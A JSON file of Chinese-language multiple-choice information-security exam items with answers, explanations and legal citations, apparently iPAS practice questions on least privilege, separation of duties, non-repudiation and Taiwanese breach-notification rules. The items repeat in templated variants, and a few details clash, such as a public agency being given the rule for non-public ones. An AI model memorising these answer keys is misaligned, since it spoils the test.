        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-054",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 單向雜湊 SHA-256",
      "B. 對稱式 AES-256 加密",
      "C. 數位簽章（Digital Signature）",
      "D. 傳輸層 TLS 加密"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-055",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某大型連鎖量販流通集團（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 72 小時內",
      "B. 36 小時內",
      "C. 1 小時內",
      "D. 24 小時內"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-056",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 應查明後以適當方式及時通知當事人",
      "B. 只要召開記者會道歉即可免責",
      "C. 僅需向警政署報案，無需通知當事人",
      "D. 必須於 1 小時內向法院提起訴訟"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-057",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. 跨網站腳本攻擊（XSS）",
      "B. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "C. 緩衝區溢位攻擊（Buffer Overflow）",
      "D. SQL 注入攻擊（SQLi）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-058",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第三階：作業指引（Work Instruction）",
      "B. 第一階：資安政策（Policy）",
      "C. 第四階：表單紀錄（Record）",
      "D. 第二階：程序 / 管理辦法（Procedure / Standard）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-059",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 縱深防禦原則",
      "B. 開放權限原則",
      "C. 最小權限原則（Principle of Least Privilege）",
      "D. 責任不可分原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-060",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某知名大型網路電商平台為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 職責區隔（Separation of Duties）",
      "B. 雙因子認證機制",
      "C. 單點容錯機制",
      "D. 帳號共用機制"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-061",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某區域教學醫學中心近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 權限分立（SoD）與帳號鑑別性",
      "B. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "C. 可用性（Availability）與完整性（Integrity）",
      "D. 隱私性（Privacy）與可用性（Availability）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-062",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某金流與行動支付科技公司在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 帳號不可共用原則",
      "B. 業務持續運作原則",
      "C. 職責區隔（Separation of Duties, SoD）",
      "D. 最小權限原則（Least Privilege）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-063",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 零信任架構（Zero Trust）",
      "B. 最小特權（Least Privilege）",
      "C. 單一簽入（Single Sign-On）",
      "D. 縱深防禦（Defense-in-Depth）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-064",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 單向雜湊 SHA-256",
      "B. 傳輸層 TLS 加密",
      "C. 數位簽章（Digital Signature）",
      "D. 對稱式 AES-256 加密"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-065",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某金流與行動支付科技公司（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 36 小時內",
      "B. 24 小時內",
      "C. 1 小時內",
      "D. 72 小時內"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-066",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某高科技晶圓代工大廠的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 只要召開記者會道歉即可免責",
      "B. 應查明後以適當方式及時通知當事人",
      "C. 必須於 1 小時內向法院提起訴訟",
      "D. 僅需向警政署報案，無需通知當事人"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-067",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "B. SQL 注入攻擊（SQLi）",
      "C. 跨網站腳本攻擊（XSS）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-068",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第一階：資安政策（Policy）",
      "B. 第三階：作業指引（Work Instruction）",
      "C. 第二階：程序 / 管理辦法（Procedure / Standard）",
      "D. 第四階：表單紀錄（Record）"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-069",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 開放權限原則",
      "B. 責任不可分原則",
      "C. 最小權限原則（Principle of Least Privilege）",
      "D. 縱深防禦原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-070",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 帳號共用機制",
      "B. 雙因子認證機制",
      "C. 職責區隔（Separation of Duties）",
      "D. 單點容錯機制"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-071",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "B. 可用性（Availability）與完整性（Integrity）",
      "C. 權限分立（SoD）與帳號鑑別性",
      "D. 隱私性（Privacy）與可用性（Availability）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-072",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某高科技晶圓代工大廠在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 最小權限原則（Least Privilege）",
      "B. 帳號不可共用原則",
      "C. 業務持續運作原則",
      "D. 職責區隔（Separation of Duties, SoD）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-073",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 零信任架構（Zero Trust）",
      "B. 單一簽入（Single Sign-On）",
      "C. 最小特權（Least Privilege）",
      "D. 縱深防禦（Defense-in-Depth）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-074",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 對稱式 AES-256 加密",
      "B. 傳輸層 TLS 加密",
      "C. 單向雜湊 SHA-256",
      "D. 數位簽章（Digital Signature）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-075",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某國立頂尖研究型大學（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 24 小時內",
      "B. 72 小時內",
      "C. 36 小時內",
      "D. 1 小時內"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-076",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 必須於 1 小時內向法院提起訴訟",
      "B. 應查明後以適當方式及時通知當事人",
      "C. 僅需向警政署報案，無需通知當事人",
      "D. 只要召開記者會道歉即可免責"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-077",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. SQL 注入攻擊（SQLi）",
      "B. 跨網站腳本攻擊（XSS）",
      "C. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-078",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第二階：程序 / 管理辦法（Procedure / Standard）",
      "B. 第四階：表單紀錄（Record）",
      "C. 第三階：作業指引（Work Instruction）",
      "D. 第一階：資安政策（Policy）"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-079",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某金流與行動支付科技公司新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 縱深防禦原則",
      "B. 開放權限原則",
      "C. 最小權限原則（Principle of Least Privilege）",
      "D. 責任不可分原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-080",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某金流與行動支付科技公司為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 帳號共用機制",
      "B. 單點容錯機制",
      "C. 雙因子認證機制",
      "D. 職責區隔（Separation of Duties）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
